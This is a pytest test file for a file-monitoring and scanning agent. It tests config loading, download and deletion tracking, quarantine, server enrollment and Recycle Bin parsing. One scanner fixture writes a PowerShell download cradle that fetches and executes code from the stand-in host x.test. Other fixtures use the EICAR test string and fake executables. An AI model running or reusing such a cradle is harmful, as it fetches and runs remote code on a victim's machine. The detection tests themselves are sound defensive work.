import hashlib
import json
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from mst_agent import file_monitor  # noqa: E402
from mst_agent.config import ConfigError, load_config  # noqa: E402
from mst_agent.file_monitor import FileMonitor, sha256_of  # noqa: E402
from mst_agent.outbox import Outbox  # noqa: E402

TOKEN = "a" * 64


def write_config(tmp_path: Path, **overrides) -> Path:
    data = {
        "server_url": "http://127.0.0.1:8081/api/",
        "device_id": "MST-PC-002",
        "device_token": TOKEN,
        "watch_folders": [str(tmp_path / "watched")],
        "ignore_extensions": [".tmp", ".crdownload"],
        "ignore_name_prefixes": ["~$"],
        "queue_file": "queue.db",
        "log_file": "agent.log",
    }
    data.update(overrides)
    path = tmp_path / "config.json"
    path.write_text(json.dumps(data), encoding="utf-8")
    return path


def test_config_loads_and_normalizes(tmp_path, monkeypatch):
    monkeypatch.setenv("MST_TEST_HOME", str(tmp_path))
    config = load_config(write_config(tmp_path, watch_folders=["$MST_TEST_HOME/watched"]))
    assert config.server_url == "http://127.0.0.1:8081/api"
    assert config.watch_folders == [tmp_path / "watched"]
    assert config.queue_file == tmp_path / "queue.db"
    assert config.ignore_extensions == {".tmp", ".crdownload"}


def test_config_rejects_missing_token_and_bad_values(tmp_path):
    with pytest.raises(ConfigError) as error:
        load_config(write_config(tmp_path, device_token="PASTE-THE-TOKEN", server_url="192.168.1.10", heartbeat_interval_seconds=1))
    message = str(error.value)
    assert "device_token" in message and "server_url" in message and "heartbeat_interval_seconds" in message


def test_config_offline_mode_does_not_need_token(tmp_path):
    assert load_config(write_config(tmp_path, device_token=""), require_token=False).device_id == "MST-PC-002"


def test_outbox_keeps_events_in_order_and_survives_reopen(tmp_path):
    outbox = Outbox(tmp_path / "q.db")
    for number in range(3):
        outbox.put({"n": number})
    first = outbox.peek(2)
    assert [event["n"] for _, event in first] == [0, 1]
    outbox.remove([row_id for row_id, _ in first])
    outbox.close()
    reopened = Outbox(tmp_path / "q.db")
    assert [event["n"] for _, event in reopened.peek()] == [2]
    reopened.close()


def test_outbox_drops_oldest_when_full(tmp_path):
    outbox = Outbox(tmp_path / "q.db", max_items=3)
    for number in range(5):
        outbox.put({"n": number})
    assert [event["n"] for _, event in outbox.peek()] == [2, 3, 4]
    outbox.close()


def test_sha256_and_size_limit(tmp_path):
    target = tmp_path / "sample.bin"
    target.write_bytes(b"mst" * 1000)
    assert sha256_of(target, 10_000) == hashlib.sha256(b"mst" * 1000).hexdigest()
    assert sha256_of(target, 100) is None


def test_ignore_rules(tmp_path):
    config = load_config(write_config(tmp_path))
    monitor = FileMonitor(config, lambda event: None)
    assert monitor.is_ignored(tmp_path / "watched" / "setup.exe.crdownload")
    assert monitor.is_ignored(tmp_path / "watched" / "~$report.docx")
    assert monitor.is_ignored(tmp_path / "queue.db-journal")
    assert not monitor.is_ignored(tmp_path / "watched" / "setup.exe")


def wait_for(events, predicate, timeout=10.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        matches = [event for event in events if predicate(event)]
        if matches:
            return matches
        time.sleep(0.1)
    return []


def test_monitor_reports_new_downloaded_and_deleted_files(tmp_path, monkeypatch):
    monkeypatch.setattr(file_monitor, "CHECK_INTERVAL", 0.2)
    watched = tmp_path / "watched"
    watched.mkdir()
    events = []
    monitor = FileMonitor(load_config(write_config(tmp_path)), events.append)
    assert monitor.start() == [watched]
    try:
        # A normal new file.
        (watched / "notes.txt").write_text("hello", encoding="utf-8")
        created = wait_for(events, lambda e: e["type"] == "created" and e["fileName"] == "notes.txt")
        assert created and created[0]["fileSize"] == 5
        assert created[0]["sha256"] == hashlib.sha256(b"hello").hexdigest()
        assert created[0]["detectedAt"].endswith("Z") and len(created[0]["uid"]) == 36

        # A browser download: written as .crdownload, then renamed when finished.
        partial = watched / "setup.exe.crdownload"
        partial.write_bytes(b"x" * 2048)
        partial.rename(watched / "setup.exe")
        download = wait_for(events, lambda e: e["type"] == "created" and e["fileName"] == "setup.exe")
        assert download and download[0]["fileSize"] == 2048

        # Office lock files are ignored.
        (watched / "~$draft.docx").write_text("lock", encoding="utf-8")

        # Deleting a file.
        (watched / "notes.txt").unlink()
        assert wait_for(events, lambda e: e["type"] == "deleted" and e["fileName"] == "notes.txt")
    finally:
        monitor.stop()
    assert not [event for event in events if "crdownload" in event["fileName"] or event["fileName"].startswith("~$")]
    assert len([event for event in events if event["type"] == "created" and event["fileName"] == "notes.txt"]) == 1


# ---- on-PC scan (Phase 11) --------------------------------------------------------------------------
from mst_agent.scanner import ScanError, scan_file  # noqa: E402


def rules(result):
    return {finding["rule"]: finding["severity"] for finding in result["indicators"]}


def scan(path, folders, expected=None, engines=()):
    return scan_file(path, folders, expected, 10_000, list(engines), 30)


def test_scan_plain_document_is_clean(tmp_path):
    target = tmp_path / "report.pdf"
    target.write_bytes(b"%PDF-1.7 demo")
    result = scan(target, [tmp_path], hashlib.sha256(b"%PDF-1.7 demo").hexdigest())
    assert result["indicators"] == [] and result["fileSize"] == 13 and result["engines"] == []
    assert result["fileType"] == {"family": "pdf", "label": "PDF document", "extension": "pdf", "extensionMatches": True}


def test_scan_flags_double_extension_and_disguised_program(tmp_path):
    fake_pdf = tmp_path / "grades.pdf.exe"
    fake_pdf.write_bytes(b"MZ" + b"\0" * 100)
    assert rules(scan(fake_pdf, [tmp_path])) == {"double_extension": "HIGH"}
    renamed_program = tmp_path / "photo.jpg"
    renamed_program.write_bytes(b"MZ" + b"\0" * 100)
    assert rules(scan(renamed_program, [tmp_path])) == {"disguised_executable": "HIGH"}


def test_scan_reports_changed_content(tmp_path):
    target = tmp_path / "notes.txt"
    target.write_text("new content", encoding="utf-8")
    assert rules(scan(target, [tmp_path], "0" * 64)) == {"hash_changed": "INFO"}


def test_scan_refuses_missing_files_and_paths_outside_watch_folders(tmp_path):
    watched, outside = tmp_path / "watched", tmp_path / "outside"
    watched.mkdir(); outside.mkdir()
    secret = outside / "secret.txt"
    secret.write_text("x", encoding="utf-8")
    with pytest.raises(ScanError):
        scan(secret, [watched])
    with pytest.raises(ScanError):
        scan(watched / "gone.exe", [watched])
    with pytest.raises(ScanError):
        scan(watched / ".." / "outside" / "secret.txt", [watched])


# ---- fixes from the code check -----------------------------------------------------------------------
from mst_agent.agent import Agent  # noqa: E402
from mst_agent.api_client import ApiError  # noqa: E402
from mst_agent.folders import onedrive_fallback, resolve_known_folder  # noqa: E402


def test_firefox_download_reports_one_new_file_and_no_false_delete(tmp_path, monkeypatch):
    monkeypatch.setattr(file_monitor, "CHECK_INTERVAL", 0.2)
    watched = tmp_path / "watched"
    watched.mkdir()
    events = []
    monitor = FileMonitor(load_config(write_config(tmp_path, ignore_extensions=[".part"])), events.append)
    monitor.start()
    try:
        (watched / "report.pdf").write_bytes(b"")              # Firefox placeholder
        (watched / "report.pdf.part").write_bytes(b"x" * 5000)  # the download in progress
        time.sleep(0.2)
        (watched / "report.pdf").unlink()
        (watched / "report.pdf.part").rename(watched / "report.pdf")
        assert wait_for(events, lambda e: e["type"] == "created" and e["fileSize"] == 5000)
        time.sleep(1.5)
    finally:
        monitor.stop()
    assert [(e["type"], e["fileName"], e["fileSize"]) for e in events] == [("created", "report.pdf", 5000)]


def test_short_lived_temp_file_is_not_reported(tmp_path, monkeypatch):
    monkeypatch.setattr(file_monitor, "CHECK_INTERVAL", 0.2)
    watched = tmp_path / "watched"
    watched.mkdir()
    events = []
    monitor = FileMonitor(load_config(write_config(tmp_path)), events.append)
    monitor.start()
    try:
        (watched / "blip.txt").write_text("x", encoding="utf-8")
        time.sleep(0.1)
        (watched / "blip.txt").unlink()
        time.sleep(1.5)
    finally:
        monitor.stop()
    assert events == []


def test_long_non_english_file_names_are_reported(tmp_path, monkeypatch):
    monkeypatch.setattr(file_monitor, "CHECK_INTERVAL", 0.2)
    watched = tmp_path / "watched"
    watched.mkdir()
    events = []
    monitor = FileMonitor(load_config(write_config(tmp_path)), events.append)
    monitor.start()
    name = "Talaan ng mga Marka ñ " + "ñ" * 60 + ".xlsx"
    try:
        (watched / name).write_text("data", encoding="utf-8")
        assert wait_for(events, lambda e: e["fileName"] == name)
    finally:
        monitor.stop()


def test_onedrive_moved_documents_are_still_watched(tmp_path, monkeypatch):
    profile, onedrive = tmp_path / "profile", tmp_path / "profile" / "OneDrive"
    (onedrive / "Documents").mkdir(parents=True)
    monkeypatch.setenv("USERPROFILE", str(profile))
    monkeypatch.setenv("OneDrive", str(onedrive))
    # Old-style config entry pointing at the profile folder that OneDrive moved away.
    config = load_config(write_config(tmp_path, watch_folders=[str(profile / "Documents")]))
    assert config.watch_folders == [onedrive / "Documents"]
    assert onedrive_fallback(tmp_path / "elsewhere" / "Documents") is None


def test_known_folder_tokens(tmp_path):
    assert resolve_known_folder("{Downloads}") is not None
    assert resolve_known_folder("{Pictures}") is None
    config = load_config(write_config(tmp_path, watch_folders=["{Downloads}", "{Desktop}", "{Documents}"]))
    assert [folder.name for folder in config.watch_folders] == ["Downloads", "Desktop", "Documents"]


class FakeClient:
    def __init__(self, error):
        self.error, self.calls = error, 0

    def send_events(self, events):
        self.calls += 1
        raise self.error

    def scan_jobs(self):
        return [], []

    def send_scan_result(self, result):
        self.calls += 1
        raise self.error


def test_permanently_rejected_events_and_results_do_not_block_the_queue(tmp_path):
    agent = Agent(load_config(write_config(tmp_path)))
    agent.outbox.put({"uid": "x"})
    agent.client = FakeClient(ApiError("Validation failed", 422))
    agent._unsent.append(("scan", {"scanId": 1}))
    agent.flush()
    agent.process_scan_jobs()
    assert len(agent.outbox) == 0 and agent._unsent == []

    # Temporary problems (server down, 500, wrong token) keep everything for a retry.
    for error in (ApiError("down"), ApiError("server error", 500), ApiError("token", 401)):
        agent.outbox.put({"uid": "y"})
        agent._unsent.append(("scan", {"scanId": 2}))
        agent.client = FakeClient(error)
        agent.flush()
        agent.process_scan_jobs()
        assert len(agent.outbox) == 1 and len(agent._unsent) == 1
        agent.outbox.remove([row_id for row_id, _ in agent.outbox.peek()])
        agent._unsent.clear()
    agent.outbox.close()


def test_tls_ca_bundle_must_exist_and_is_used(tmp_path):
    with pytest.raises(ConfigError) as error:
        load_config(write_config(tmp_path, tls_ca_bundle="missing-ca.pem"))
    assert "tls_ca_bundle" in str(error.value)
    (tmp_path / "lab-ca.pem").write_text("-----BEGIN CERTIFICATE-----\n", encoding="utf-8")
    config = load_config(write_config(tmp_path, tls_ca_bundle="lab-ca.pem"))
    from mst_agent.api_client import ApiClient
    assert ApiClient(config).session.verify == str(tmp_path / "lab-ca.pem")
    assert ApiClient(load_config(write_config(tmp_path))).session.verify is True


# ---- Phase 13: real scanner (static analysis, antivirus engines, quarantine, file activity) ---------------
import shutil as _shutil  # noqa: E402
import zipfile  # noqa: E402

from mst_agent import antivirus  # noqa: E402
from mst_agent.analysis import identify  # noqa: E402
from mst_agent.quarantine import Quarantine, QuarantineError  # noqa: E402

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def test_static_analysis_finds_macros_programs_in_archives_scripts_and_active_pdfs(tmp_path):
    with zipfile.ZipFile(tmp_path / "report.docm", "w") as archive:
        archive.writestr("[Content_Types].xml", "<Types/>")
        archive.writestr("word/vbaProject.bin", "VBA")
    with zipfile.ZipFile(tmp_path / "tools.zip", "w") as archive:
        archive.writestr("setup.exe", "MZ")
    (tmp_path / "update.ps1").write_text("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')", encoding="utf-8")
    (tmp_path / "lesson.pdf").write_bytes(b"%PDF-1.4 << /OpenAction << /S /JavaScript /JS (x) >> >>")
    (tmp_path / "notes.pdf").write_text("just text", encoding="utf-8")
    assert identify(tmp_path / "report.docm")["family"] == "ooxml"
    assert rules(scan(tmp_path / "report.docm", [tmp_path])) == {"office_macros": "MEDIUM"}
    assert rules(scan(tmp_path / "tools.zip", [tmp_path])) == {"archive_executable": "MEDIUM"}
    assert rules(scan(tmp_path / "update.ps1", [tmp_path]))["suspicious_script"] == "MEDIUM"
    assert rules(scan(tmp_path / "lesson.pdf", [tmp_path])) == {"pdf_active_content": "MEDIUM"}
    assert rules(scan(tmp_path / "notes.pdf", [tmp_path])) == {"type_mismatch": "MEDIUM"}


def test_engines_none_and_missing_engines(tmp_path):
    assert antivirus.engines_status("none") == []
    status = antivirus.engines_status("clamav", clamav="/nonexistent/clamscan")
    assert status[0]["available"] is False and "not installed" in status[0]["detail"]
    (tmp_path / "x.txt").write_text("x", encoding="utf-8")
    result = scan(tmp_path / "x.txt", [tmp_path], engines=status)
    assert result["engines"][0]["result"] == "unavailable"


@pytest.mark.skipif(not _shutil.which("clamscan"), reason="ClamAV is not installed")
def test_clamav_detects_the_eicar_test_file(tmp_path):
    database = tmp_path / "db"
    database.mkdir()
    (database / "test.hdb").write_text(f"{hashlib.md5(EICAR).hexdigest()}:{len(EICAR)}:Eicar-Test-Signature\n", encoding="utf-8")
    antivirus._info_cache.clear()
    engines = antivirus.engines_status("clamav", clamav_database=str(database))
    assert engines[0]["available"] and engines[0]["version"]
    (tmp_path / "eicar.com").write_bytes(EICAR)
    (tmp_path / "clean.txt").write_text("hello", encoding="utf-8")
    detected = scan(tmp_path / "eicar.com", [tmp_path], engines=engines)["engines"][0]
    assert detected["result"] == "detected" and detected["signature"].startswith("Eicar-Test-Signature")
    assert scan(tmp_path / "clean.txt", [tmp_path], engines=engines)["engines"][0]["result"] == "clean"


def test_quarantine_release_and_delete_verify_the_file(tmp_path):
    watched, vault = tmp_path / "watched", tmp_path / "quarantine"
    watched.mkdir()
    target = watched / "invoice.pdf.exe"
    target.write_bytes(b"MZ evil")
    digest = hashlib.sha256(b"MZ evil").hexdigest()
    quarantine = Quarantine(vault, [watched], 10_000)
    with pytest.raises(QuarantineError, match="changed"):
        quarantine.quarantine(7, str(target), "0" * 64)
    name = quarantine.quarantine(7, str(target), digest)
    assert not target.exists() and (vault / name).exists() and name == f"7-{digest[:16]}.quarantined"
    assert quarantine.quarantine(7, str(target), digest) == name          # a retried request is safe
    quarantine.release(name, str(target), digest)
    assert target.read_bytes() == b"MZ evil" and not (vault / name).exists()
    name = quarantine.quarantine(8, str(target), digest)
    target.write_bytes(b"new file with the same name")
    with pytest.raises(QuarantineError, match="same name"):
        quarantine.release(name, str(target), digest)
    quarantine.delete(name, digest)
    quarantine.delete(name, digest)                                         # already deleted: still fine
    assert list(vault.iterdir()) == []
    with pytest.raises(QuarantineError, match="Invalid"):
        quarantine.delete("../../watched/invoice.pdf.exe", digest)
    outside = tmp_path / "outside.exe"
    outside.write_bytes(b"MZ")
    with pytest.raises(QuarantineError, match="outside"):
        quarantine.quarantine(9, str(outside), hashlib.sha256(b"MZ").hexdigest())


def test_quarantine_folder_cannot_be_inside_a_watch_folder(tmp_path):
    with pytest.raises(ConfigError, match="quarantine_folder"):
        load_config(write_config(tmp_path, quarantine_folder=str(tmp_path / "watched" / "q")))


def test_monitor_reports_renames_real_modifications_and_browser_downloads(tmp_path, monkeypatch):
    monkeypatch.setattr(file_monitor, "CHECK_INTERVAL", 0.2)
    watched = tmp_path / "watched"
    watched.mkdir()
    events = []
    monitor = FileMonitor(load_config(write_config(tmp_path)), events.append)
    monitor.start()
    try:
        (watched / "draft.txt").write_text("one", encoding="utf-8")
        assert wait_for(events, lambda e: e["type"] == "created" and e["fileName"] == "draft.txt")
        assert events[0]["origin"] == "local" and events[0]["previousPath"] is None
        (watched / "draft.txt").rename(watched / "final.txt")
        renamed = wait_for(events, lambda e: e["type"] == "renamed")
        assert renamed and renamed[0]["previousPath"] == str(watched / "draft.txt") and renamed[0]["sha256"] == hashlib.sha256(b"one").hexdigest()
        (watched / "final.txt").write_text("two", encoding="utf-8")
        modified = wait_for(events, lambda e: e["type"] == "modified")
        assert modified and modified[0]["sha256"] == hashlib.sha256(b"two").hexdigest()
        partial = watched / "setup.exe.crdownload"
        partial.write_bytes(b"x" * 100)
        partial.rename(watched / "setup.exe")
        download = wait_for(events, lambda e: e["fileName"] == "setup.exe")
        assert download and download[0]["type"] == "created" and download[0]["origin"] == "browser_download"
        monitor.suppress(watched / "setup.exe")
        (watched / "setup.exe").unlink()
        time.sleep(1.0)
    finally:
        monitor.stop()
    assert len([e for e in events if e["type"] == "modified"]) == 1
    assert not [e for e in events if e["type"] == "deleted"]


class ActionClient(FakeClient):
    def __init__(self, actions):
        super().__init__(None)
        self.actions, self.results = actions, []

    def scan_jobs(self):
        return [], self.actions

    def send_action_result(self, result):
        self.results.append(result)


def test_agent_carries_out_quarantine_actions_and_reports_them(tmp_path):
    watched = tmp_path / "watched"
    watched.mkdir()
    target = watched / "tool.exe"
    target.write_bytes(b"MZ")
    digest = hashlib.sha256(b"MZ").hexdigest()
    agent = Agent(load_config(write_config(tmp_path)))
    agent.client = ActionClient([{"itemId": 3, "action": "quarantine", "originalPath": str(target), "sha256": digest, "quarantineName": None},
                                 {"itemId": 4, "action": "delete", "originalPath": str(target), "sha256": digest, "quarantineName": "../x"}])
    assert agent.process_scan_jobs() == 2
    first, second = agent.client.results
    assert first == {"itemId": 3, "action": "quarantine", "outcome": "completed", "quarantineName": f"3-{digest[:16]}.quarantined"}
    assert second["outcome"] == "failed" and "Invalid" in second["error"]
    assert not target.exists() and (tmp_path / "quarantine" / first["quarantineName"]).exists()
    agent.outbox.close()


from mst_agent.single_instance import AlreadyRunning, SingleInstance  # noqa: E402


def test_only_one_agent_can_run_at_a_time(tmp_path):
    first = SingleInstance(tmp_path / "mst_agent.lock")
    first.acquire()
    with pytest.raises(AlreadyRunning):
        SingleInstance(tmp_path / "mst_agent.lock").acquire()
    first.release()
    second = SingleInstance(tmp_path / "mst_agent.lock")
    second.acquire()  # free again once the first agent has stopped
    second.release()


# ---- Phase 15: enrollment and finding the server ------------------------------------------------------------
from mst_agent import discovery, enroll as enroll_module  # noqa: E402
from mst_agent.config_store import read_json  # noqa: E402


def test_enrollment_keys_and_server_addresses_are_normalized():
    assert discovery.normalize_key("q7uw-fyz4 bdtz-ux2u") == "Q7UWFYZ4BDTZUX2U"
    assert discovery.normalize_key("Q7UW-FYZ4-BDTZ-UX20") is None  # 0 is not in the key alphabet
    assert discovery.normalize_key("short") is None
    assert discovery.normalize_server("192.168.0.61") == "http://192.168.0.61:8081/api"
    assert discovery.normalize_server("192.168.0.61:9000") == "http://192.168.0.61:9000/api"
    assert discovery.normalize_server("http://192.168.0.61:8081/api/") == "http://192.168.0.61:8081/api"


def test_proof_matches_the_php_server():
    # php -r 'echo hash_hmac("sha256", "00112233445566778899aabbccddeeff", hash("sha256", "Q7UWFYZ4BDTZUX2U"));'
    assert discovery.proof("Q7UWFYZ4BDTZUX2U", "00112233445566778899aabbccddeeff") == "350713f8d772c09f2997aa0cccc9f49cc0ed88e23f46a1dc96976291a60dec9e"


class IdentifyResponse:
    def __init__(self, data):
        self._data = data

    def json(self):
        return {"success": True, "data": self._data}


def test_only_a_server_that_knows_the_secret_is_accepted(monkeypatch):
    def real_server(url, json, **kwargs):
        return IdentifyResponse({"service": "MST", "proofs": ["0" * 64, discovery.proof(TOKEN, json["nonce"])]})

    def impostor(url, json, **kwargs):  # answers like MST but cannot compute the proof
        return IdentifyResponse({"service": "MST", "proofs": [discovery.proof("someone-else", json["nonce"])]})

    monkeypatch.setattr(discovery.requests, "post", real_server)
    assert discovery.verify_server("http://10.0.0.5:8081/api", TOKEN, "MST-PC-002")
    monkeypatch.setattr(discovery.requests, "post", impostor)
    assert not discovery.verify_server("http://10.0.0.6:8081/api", TOKEN, "MST-PC-002")


def test_find_server_checks_open_ports_then_the_proof(monkeypatch):
    monkeypatch.setattr(discovery, "local_networks", lambda: [discovery.ipaddress.IPv4Network("10.1.2.0/29")])
    monkeypatch.setattr(discovery, "_port_open", lambda host, port, timeout: host in ("10.1.2.3", "10.1.2.5"))
    monkeypatch.setattr(discovery, "verify_server", lambda url, *args, **kwargs: url == "http://10.1.2.5:8081/api")
    assert discovery.find_server(TOKEN, "MST-PC-002") == "http://10.1.2.5:8081/api"
    monkeypatch.setattr(discovery, "verify_server", lambda *args, **kwargs: False)
    assert discovery.find_server(TOKEN, "MST-PC-002") is None


class EnrollResponse:
    status_code = 201

    def json(self):
        return {"success": True, "data": {"deviceId": "MST-PC-007", "deviceToken": "b" * 64, "reused": False}}


def test_enroll_writes_config_from_the_example(tmp_path, monkeypatch):
    example = tmp_path / "config.example.json"
    example.write_text(json.dumps({"server_url": "http://x", "device_id": "MST-PC-002", "device_token": "PASTE", "watch_folders": ["{Downloads}"]}))
    sent = {}
    monkeypatch.setattr(enroll_module, "heartbeat_payload", lambda url: {"hostname": "LAB-PC-07", "macAddress": "AA:BB:CC:DD:EE:07", "operatingSystem": "Windows 11"})
    monkeypatch.setattr(enroll_module.requests, "post", lambda url, json, **kwargs: sent.update(url=url, body=json) or EnrollResponse())
    result = enroll_module.enroll("abcd-efgh-jkmn-pqrs", tmp_path / "config.json", example, server="192.168.0.61", data_dir="%LOCALAPPDATA%\\MST-Agent")
    assert result == {"serverUrl": "http://192.168.0.61:8081/api", "deviceId": "MST-PC-007", "reused": False}
    assert sent["url"] == "http://192.168.0.61:8081/api/agent/enroll" and sent["body"]["key"] == "ABCDEFGHJKMNPQRS"
    config = read_json(tmp_path / "config.json")
    assert config["device_id"] == "MST-PC-007" and config["device_token"] == "b" * 64 and config["watch_folders"] == ["{Downloads}"]
    assert config["queue_file"] == "%LOCALAPPDATA%\\MST-Agent\\mst_agent_queue.db"
    with pytest.raises(enroll_module.EnrollError):
        enroll_module.enroll("not-a-key", tmp_path / "config.json", example, server="192.168.0.61")


def test_agent_saves_the_new_server_address_after_finding_it(tmp_path, monkeypatch):
    from mst_agent import agent as agent_module
    path = write_config(tmp_path)
    (tmp_path / "watched").mkdir(exist_ok=True)
    agent = agent_module.Agent(load_config(path))
    agent._failed_heartbeats = 3
    monkeypatch.setattr(agent_module, "find_server", lambda *args, **kwargs: "http://10.9.8.7:8081/api")
    assert agent.rediscover()
    assert agent.config.server_url == "http://10.9.8.7:8081/api"
    assert read_json(path)["server_url"] == "http://10.9.8.7:8081/api"
    agent.outbox.close()


# ---- Phase 16: Recycle Bin, permanent deletes, wider watch scope -------------------------------------------
import struct  # noqa: E402
from datetime import datetime, timedelta, timezone  # noqa: E402

from mst_agent import recycle_bin  # noqa: E402


def index_record(original: str, size: int, when: datetime, version: int = 2) -> bytes:
    """A Windows $I record: version, size, delete time (FILETIME), path (v1: fixed 260 chars, v2: length + path)."""
    filetime = int((when - datetime(1601, 1, 1, tzinfo=timezone.utc)) / timedelta(microseconds=1)) * 10
    path = original.encode("utf-16-le")
    if version == 1:
        return struct.pack("<qqq", 1, size, filetime) + path.ljust(520, b"\0")
    return struct.pack("<qqqi", 2, size, filetime, len(original) + 1) + path + b"\0\0"


def test_recycle_bin_records_are_parsed_both_formats():
    when = datetime(2026, 10, 27, 6, 14, 5, tzinfo=timezone.utc)
    for version in (1, 2):
        record = recycle_bin.parse_index(index_record(r"C:\Users\Student\Documents\report.docx", 12345, when, version))
        assert record == {"originalPath": r"C:\Users\Student\Documents\report.docx", "size": 12345, "deletedAt": "2026-10-27T06:14:05Z"}
    assert recycle_bin.parse_index(b"garbage") is None
    assert recycle_bin.parse_index(struct.pack("<qqq", 7, 1, 1)) is None


def test_recycle_bin_changes_while_the_agent_was_off_are_reported(tmp_path):
    bin_folder = tmp_path / "bin"
    bin_folder.mkdir()
    state = tmp_path / "state.json"
    old = datetime(2026, 10, 1, tzinfo=timezone.utc)
    (bin_folder / "$IAAAAAA.txt").write_bytes(index_record(str(tmp_path / "old.txt"), 1, old))
    recycled, removed = [], []
    first = recycle_bin.RecycleBinWatcher([bin_folder], state, recycled.append, lambda record, off: removed.append((record, off)))
    first.start(); first.stop()
    assert recycled == [] and removed == []  # first start: what is already there is only the starting point
    (bin_folder / "$IAAAAAA.txt").unlink()  # emptied while the agent was off
    (bin_folder / "$IBBBBBB.pdf").write_bytes(index_record(str(tmp_path / "new.pdf"), 2, old + timedelta(days=1)))
    second = recycle_bin.RecycleBinWatcher([bin_folder], state, recycled.append, lambda record, off: removed.append((record, off)))
    second.start(); second.stop()
    assert [item["originalPath"] for item in recycled] == [str(tmp_path / "new.pdf")]
    assert recycled[0]["deletedAt"] == "2026-10-02T00:00:00Z"  # the real delete time, not when the agent noticed
    assert [(item["originalPath"], off) for item, off in removed] == [(str(tmp_path / "old.txt"), True)]


def deletion_monitor(tmp_path):
    (tmp_path / "watched").mkdir(exist_ok=True)
    (tmp_path / "bin").mkdir(exist_ok=True)
    # The test folders live under /tmp; "tmp" is on the default noise list, so use a list without it.
    config = load_config(write_config(tmp_path, recycle_bin_folders=[str(tmp_path / "bin")], ignore_folders=["AppData", ".git", "$Recycle.Bin"]))
    events: list[dict] = []
    monitor = FileMonitor(config, events.append)
    monitor.start()
    return monitor, events


def wait_until(condition, timeout=10.0):
    end = time.time() + timeout
    while time.time() < end:
        if condition():
            return True
        time.sleep(0.1)
    return False


def test_explorer_delete_is_reported_once_as_moved_to_recycle_bin(tmp_path):
    monitor, events = deletion_monitor(tmp_path)
    try:
        target = tmp_path / "watched" / "notes.txt"
        target.write_text("hello")
        assert wait_until(lambda: any(e["type"] == "created" for e in events))
        when = datetime(2026, 10, 27, 1, 2, 3, tzinfo=timezone.utc)
        target.unlink()  # what the folder watcher sees: the file left the folder ...
        (tmp_path / "bin" / "$IQ1W2E3.txt").write_bytes(index_record(str(target), 5, when))  # ... and Windows' record
        assert wait_until(lambda: any(e["type"] == "deleted" for e in events))
        time.sleep(4)  # longer than the grace period: no second "permanent" event may follow
        deletes = [e for e in events if e["type"] == "deleted"]
        assert len(deletes) == 1
        assert deletes[0]["deleteMode"] == "recycle_bin" and deletes[0]["detectedAt"] == "2026-10-27T01:02:03Z"
        assert deletes[0]["filePath"] == str(target) and deletes[0]["fileSize"] == 5 and deletes[0]["isFolder"] is False
    finally:
        monitor.stop()


def test_recycle_bin_reports_deletes_from_folders_that_are_not_watched(tmp_path):
    monitor, events = deletion_monitor(tmp_path)
    try:
        elsewhere = tmp_path / "Projects" / "plan.xlsx"  # not inside the watched folder
        (tmp_path / "bin" / "$RZZ9.xlsx").mkdir()          # a folder in the Recycle Bin -> isFolder
        (tmp_path / "bin" / "$IZZ9.xlsx").write_bytes(index_record(str(elsewhere), 9, datetime.now(timezone.utc)))
        assert wait_until(lambda: any(e.get("deleteMode") == "recycle_bin" for e in events))
        event = next(e for e in events if e.get("deleteMode") == "recycle_bin")
        assert event["filePath"] == str(elsewhere) and event["isFolder"] is True
        (tmp_path / "bin" / "$IAPP.dat").write_bytes(index_record(str(tmp_path / "x" / "AppData" / "cache.dat"), 1, datetime.now(timezone.utc)))
        time.sleep(1.5)
        assert not any("AppData" in e["filePath"] for e in events)  # noise folders are ignored here too
    finally:
        monitor.stop()


def test_shift_delete_is_reported_as_permanent_and_emptying_as_removed(tmp_path):
    monitor, events = deletion_monitor(tmp_path)
    try:
        target = tmp_path / "watched" / "secret.docx"
        target.write_text("x")
        assert wait_until(lambda: any(e["type"] == "created" for e in events))
        target.unlink()  # no Recycle Bin record: Shift+Delete
        assert wait_until(lambda: any(e.get("deleteMode") == "permanent" for e in events), timeout=8)
        # In the Recycle Bin, then emptied: reported as removed (permanently gone)
        gone = tmp_path / "Documents" / "old.pptx"
        index = tmp_path / "bin" / "$IEMPTY.pptx"
        index.write_bytes(index_record(str(gone), 3, datetime.now(timezone.utc)))
        assert wait_until(lambda: any(e.get("deleteMode") == "recycle_bin" and e["filePath"] == str(gone) for e in events))
        index.unlink()
        assert wait_until(lambda: any(e.get("deleteMode") == "recycle_bin_removed" for e in events), timeout=8)
        # Restored items are not deletions
        restored = tmp_path / "watched" / "back.txt"
        index2 = tmp_path / "bin" / "$IRESTO.txt"
        index2.write_bytes(index_record(str(restored), 1, datetime.now(timezone.utc)))
        assert wait_until(lambda: sum(e.get("deleteMode") == "recycle_bin" for e in events) == 2)
        restored.write_text("restored")
        index2.unlink()
        time.sleep(3.5)
        assert not any(e.get("deleteMode") == "recycle_bin_removed" and e["filePath"] == str(restored) for e in events)
    finally:
        monitor.stop()


def test_noise_folders_inside_watched_folders_are_ignored(tmp_path):
    monitor, events = deletion_monitor(tmp_path)
    try:
        for folder in ("AppData/Local", ".git", "Documents"):
            (tmp_path / "watched" / folder).mkdir(parents=True)
        (tmp_path / "watched" / "AppData" / "Local" / "cache.bin").write_text("x")
        (tmp_path / "watched" / ".git" / "index").write_text("x")
        (tmp_path / "watched" / "Documents" / "essay.docx").write_text("x")
        assert wait_until(lambda: any(e["fileName"] == "essay.docx" for e in events))
        time.sleep(2.5)
        assert {e["fileName"] for e in events} == {"essay.docx"}
    finally:
        monitor.stop()


def test_watch_scope_placeholders(tmp_path, monkeypatch):
    from mst_agent import config as config_module
    profile = tmp_path / "profile"
    (profile / "Downloads").mkdir(parents=True)
    monkeypatch.setattr(config_module, "user_profile", lambda: profile)
    monkeypatch.setattr(config_module, "other_fixed_drives", lambda: [tmp_path / "D"])
    config = load_config(write_config(tmp_path, watch_folders=["{UserProfile}", str(profile / "Downloads"), "{OtherDrives}", "{RemovableDrives}"],
                                      quarantine_folder=str(profile / "AppData" / "MST" / "quarantine")))
    assert config.watch_folders == [profile, tmp_path / "D"]  # Downloads is inside the profile: not watched twice
    assert config.watch_removable_drives is True
    assert config.watch_recycle_bin is True  # on by default
